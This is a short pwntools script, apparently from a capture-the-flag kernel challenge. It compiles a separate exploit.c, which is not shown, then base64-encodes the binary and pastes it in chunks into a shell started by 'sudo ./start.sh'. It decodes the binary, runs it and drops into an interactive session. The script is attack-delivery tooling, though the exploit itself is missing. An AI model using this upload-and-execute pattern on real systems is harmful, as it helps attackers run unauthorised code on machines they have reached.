#!/usr/bin/env python3
from pwn import *
import subprocess

subprocess.run('gcc -nostdlib -static -masm=intel -o /tmp/exploit exploit.c', shell=True, check=True)
# subprocess.run('strip -s /tmp/exploit', shell=True)
# subprocess.run('gzip -f /tmp/exploit', shell=True)
# subprocess.run('base64 /tmp/exploit.gz > /tmp/exploit.gz.base64', shell=True)
subprocess.run('base64 /tmp/exploit > /tmp/exploit.base64', shell=True)
with open('/tmp/exploit.base64', 'r') as f:
    exploit = f.read()

s = process('sudo ./start.sh', shell=True)
s.recvuntil('$ ')
s.sendline('cd /tmp')

for i in range(0, len(exploit), 800):
    s.sendline('echo -n "' + exploit[i:i+800] + '" >> exploit.base64')
s.sendline('base64 -d exploit.base64 > exploit')
# s.sendline('base64 -d exploit.gz.base64 > exploit.gz')
# s.sendline('gzip -d exploit.gz')
s.sendline('chmod +x exploit')
s.sendline('./exploit')
s.interactive()
